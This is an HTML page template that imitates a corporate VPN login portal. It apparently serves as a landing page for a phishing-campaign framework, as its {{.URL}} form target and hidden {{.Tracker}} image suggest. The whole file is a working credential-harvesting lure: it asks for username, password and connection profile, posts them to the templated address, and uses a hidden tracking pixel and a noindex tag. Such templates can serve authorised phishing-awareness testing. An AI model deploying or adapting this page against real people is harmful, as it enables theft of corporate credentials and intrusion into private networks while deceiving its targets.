<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>VPN Portal - Secure Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .portal-container { width: 420px; }
        .portal-header { text-align: center; margin-bottom: 32px; }
        .shield-icon { width: 64px; height: 64px; margin: 0 auto 16px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .shield-icon svg { width: 32px; height: 32px; fill: #4fc3f7; }
        .portal-header h1 { font-size: 24px; font-weight: 600; color: #fff; margin-bottom: 4px; }
        .portal-header p { font-size: 14px; color: rgba(255,255,255,0.6); }
        .login-card { background: rgba(255,255,255,0.95); border-radius: 12px; padding: 36px 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); backdrop-filter: blur(10px); }
        .login-card h2 { font-size: 18px; font-weight: 600; color: #1a1a2e; margin-bottom: 24px; text-align: center; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 13px; font-weight: 600; color: #555; margin-bottom: 6px; }
        .form-group input, .form-group select { width: 100%; padding: 11px 14px; border: 1px solid #d0d0d0; border-radius: 6px; font-size: 14px; outline: none; transition: all 0.2s; background: #fff; }
        .form-group input:focus, .form-group select:focus { border-color: #0f3460; box-shadow: 0 0 0 3px rgba(15,52,96,0.15); }
        .form-group .input-icon { position: relative; }
        .form-group .input-icon svg { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); width: 16px; height: 16px; fill: #999; }
        .form-group .input-icon input { padding-left: 38px; }
        .submit-btn { width: 100%; background: linear-gradient(135deg, #0f3460, #1a5276); color: #fff; border: none; padding: 12px; border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 8px; }
        .submit-btn:hover { background: linear-gradient(135deg, #1a5276, #0f3460); box-shadow: 0 4px 12px rgba(15,52,96,0.4); }
        .help-links { text-align: center; margin-top: 16px; }
        .help-links a { font-size: 13px; color: #0f3460; text-decoration: none; }
        .help-links a:hover { text-decoration: underline; }
        .security-notice { text-align: center; margin-top: 24px; font-size: 11px; color: rgba(255,255,255,0.5); }
        .security-notice svg { width: 12px; height: 12px; fill: rgba(255,255,255,0.5); vertical-align: middle; margin-right: 4px; }
        @media (max-width: 480px) { .portal-container { width: 100%; padding: 20px; } .login-card { border-radius: 8px; } }
    </style>
</head>
<body>
    <div class="portal-container">
        <div class="portal-header">
            <div class="shield-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            <h1>Corporate VPN Portal</h1>
            <p>Secure Remote Access Gateway</p>
        </div>
        <div class="login-card">
            <h2>Authenticate to Connect</h2>
            <form action="{{.URL}}" method="POST">
                <div class="form-group">
                    <label for="group">Connection Profile</label>
                    <select id="group" name="group">
                        <option value="corporate">Corporate Network</option>
                        <option value="remote">Remote Access</option>
                        <option value="contractor">Contractor Access</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="username">Username</label>
                    <div class="input-icon">
                        <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                        <input type="text" id="username" name="username" placeholder="Enter your username" required autofocus>
                    </div>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <div class="input-icon">
                        <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
                    </div>
                </div>
                <button type="submit" class="submit-btn">Connect</button>
            </form>
            <div class="help-links">
                <a href="#">Need help? Contact IT Support</a>
            </div>
        </div>
        <div class="security-notice">
            <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/></svg>
            Secured with TLS 1.3 encryption
        </div>
    </div>
    <img src="{{.Tracker}}" style="display:none" alt="">
</body>
</html>
